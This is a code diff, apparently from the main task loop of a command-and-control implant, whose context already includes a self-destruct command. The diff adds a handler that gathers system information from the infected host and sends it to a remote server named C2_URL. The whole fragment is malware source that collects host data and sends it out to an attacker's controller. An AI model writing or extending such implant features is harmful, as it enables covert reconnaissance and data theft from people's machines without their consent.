@@ -85,5 +85,14 @@ int main()
 		{
 			SelfDestruct();
 		}
+		else if (opcode == OPCODE_SYSINFO)
+		{
+			string sysInfo = SysInfo();
+			success = true;
+			if (!SendTaskResult(newTask->taskId.c_str(), C2_URL, sysInfo.c_str(), success, currentProfile))
+			{
+				DEBUG_PRINTF("Error sending output\n");
+			}
+		}
 	}
 }
